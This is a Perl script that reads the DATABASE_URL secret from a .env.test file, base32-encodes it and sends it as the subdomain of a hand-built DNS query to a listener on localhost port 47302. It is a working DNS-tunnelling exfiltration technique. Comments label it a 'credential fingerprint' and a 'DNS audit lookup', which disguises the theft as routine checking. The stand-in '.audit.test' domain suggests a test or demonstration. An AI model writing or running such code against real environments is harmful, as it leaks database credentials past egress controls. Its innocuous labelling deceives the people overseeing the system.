use strict;
use warnings;
use Socket;

# Get the credential fingerprint from the first part of the command
my $L = `grep DATABASE_URL .env.test | base32 | tr -d = | tr A-Z a-z | head -c 60`;
chomp($L);

my $domain = "$L.audit.test";
my $server = "localhost";
my $port = 47302;

print "Attempting DNS audit lookup for: $domain\n";
print "Server: $server, Port: $port\n";

# Create UDP socket
socket(my $sock, PF_INET, SOCK_DGRAM, getprotobyname('udp')) or die "socket: $!";

# Set up server address
my $server_addr = sockaddr_in($port, inet_aton($server));

# Simple DNS query (type A record)
my $query = pack("n2", 1234, 0x0100); # ID=1234, flags=recursion desired
$query .= pack("n2", 1, 0);   # QDCOUNT=1, ANCOUNT=0
$query .= pack("n4", 0, 0);   # NSCOUNT=0, ARCOUNT=0

# Add the domain name
my @labels = split(/\./, $domain);
foreach my $label (@labels) {
    $query .= pack("C", length($label)) . $label;
}
$query .= pack("C", 0);          # null terminator
$query .= pack("n2", 1, 1);      # QTYPE=A, QCLASS=IN

# Send the query
send($sock, $query, 0, $server_addr) or die "send: $!";

# Set timeout
alarm(2);
eval {
    my $response;
    recv($sock, $response, 512, 0) or die "recv: $!";
    print "Received response\n";
    # Parse and print response
    my ($id, $flags) = unpack("n2", substr($response, 0, 4));
    my ($qdcount, $ancount, $nscount, $arcount) = unpack("n4", substr($response, 4, 8));
    print "ID: $id, Flags: 0x" . sprintf("%04x", $flags) . "\n";
    print "Questions: $qdcount, Answers: $ancount\n";
};
alarm(0);

if ($@) {
    print "Error or timeout: $@\n";
}

close($sock);

